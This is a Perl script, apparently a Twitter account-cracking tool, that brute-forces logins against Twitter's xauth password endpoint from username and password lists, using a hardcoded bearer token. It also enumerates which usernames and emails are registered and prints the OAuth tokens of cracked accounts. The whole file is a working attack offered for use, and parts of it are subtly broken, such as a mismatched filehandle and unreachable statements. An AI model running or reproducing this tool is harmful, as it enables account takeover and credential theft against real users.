use LWP::UserAgent;

print q(Choose {1 to 4} :-
1 - Brute Force
2 - Checker Usernames
3 - Checker Emails
4 - Exit
> );
$do = <STDIN>;
chomp($do);
if($do == 1){
	print "List Of Usernames => ";
	$userlist = <STDIN>;
	chomp($userlist);
	print "List Of Passwords => ";
	$passlist = <STDIN>;
	chomp($passlist);
	open (USERFILE, "<$userlist") || die "[-] Can't Found ($userlist) !";
	@USERS = <USERFILE>;
	close USERFILE;
	open (PASSFILE, "<$passlist") || die "[-] Can't Found ($passlist) !";
	@PASSS = <PASSFILE>;
	close PASSFILE;
	system('cls');
	print "Cracking Now !..\n";
	foreach $username1 (@USERS) {
	chomp $username1;
		foreach $password1 (@PASSS) {
		chomp $password1;
			print login($username1,$password1);
		}
	}
}
if($do == 2){
	print "List Of Usernames => ";
	$userlist = <STDIN>;
	chomp($userlist);
	open (USERFILE, "<$userlist") || die "[-] Can't Found ($userlist) !";
	@USERS = <USERFILE>;
	close USERFILE;
	system('cls');
	print "Checking Now !..\n";
	foreach $username2 (@USERS) {
	chomp $username2;
		print check_user($username2);
	}
}
if($do == 3){
	print "List Of Emails => ";
	$emaillist = <STDIN>;
	chomp($emaillist);
	open (USERFILE, "<$emaillist") || die "[-] Can't Found ($emaillist) !";
	@EMAILS = <EMAILFILE>;
	close EMAILFILE;
	system('cls');
	print "Checking Now !..\n";
	foreach $email (@EMAILS) {
	chomp $email;
		print check_email($email);
	}
}
if($do == 4){ exit(); }
########################
$simple = LWP::UserAgent->new();
sub key(){
	$k = LWP::UserAgent->new();
	$k->default_header("Authorization" => 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F');
	$r = $k->post('https://api.twitter.com/1.1/guest/activate.json',{});
	return $r->content=~/{"guest_token":"(.+?)"}/;
}
sub login(){
	($username,$password) = @_;
	$login = LWP::UserAgent->new();
	$login->default_header("X-Guest-Token" => key());
	$login->default_header("Authorization" => 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F');
	$logging = $login->post('https://api.twitter.com/auth/1/xauth_password.json',{x_auth_identifier=>$username,x_auth_password=>$password});
	if($logging->content=~/"oauth_token"/){
		return "\n--------------\nLogged Dude d:\nUsername: $username\nPassword: $password\nOAuth-Token: ";
		return $logging->content=~/"oauth_token":"(.+?)"/;
		return "\n--------------\n";
	}
	else
	{
		if($logging->content=~/Could not authenticate you/){
			return "Failed -> ($username:$password)\n"
		}
		else
		{
			return "Blocked :( Wait\n";
			sleep(7);
		}
	}
}
sub check_user(){
	($user) = @_;
	$req = LWP::UserAgent->new();
	$check = $req->get('https://api.twitter.com/i/users/username_available.json?username='.$user);
	if($check->content=~/"reason":"available"/){
		return "Available -> ($user)\n";
	}
	else
	{
		if($check->content=~/"reason":"taken"/){
			return "Taken -> ($user)\n";
		}
		else
		{
			if($check->content=~/"reason":"custom_message"/){
				return "non-number -> ($user)\n";
			}
			else
			{
				if($check->content=~/"reason":"improper_format"/){
					return "Only use letters,numbers -> ($user)\n";
				}
				else
				{
					if($check->content=~/"reason":"invalid_username"/){
						return "must be longer than 4 characters -> ($user)\n";
					}
					else
					{
						return "Blocked :( Wait\n";
						sleep(7);
					}
				}
			}
		}
	}
}
sub check_email(){
	($mail) = @_;
	$req1 = LWP::UserAgent->new();
	$ch = $req1->get('https://api.twitter.com/i/users/email_available.json?email='.$mail);
	if($ch->content=~/"msg":"Available!"/){
		return "Available -> ($mail)\n";
	}
	else
	{
		if($ch->content=~/"msg":"Email has already been taken."/){
			return "Taken -> ($email)\n";
		}
		else
		{
			if($ch->content=~/"msg":"You cannot have a blank email address."/){
				return "You cannot have a blank email -> ($email)\n";
			}
			else
			{
				if($ch->content=~/"msg":"This email is invalid."/){
					return "This email is invalid -> ($email)\n";
				}
				else
				{
					return "Blocked :( Wait\n";
					sleep(7);
				}
			}
		}
	}
}
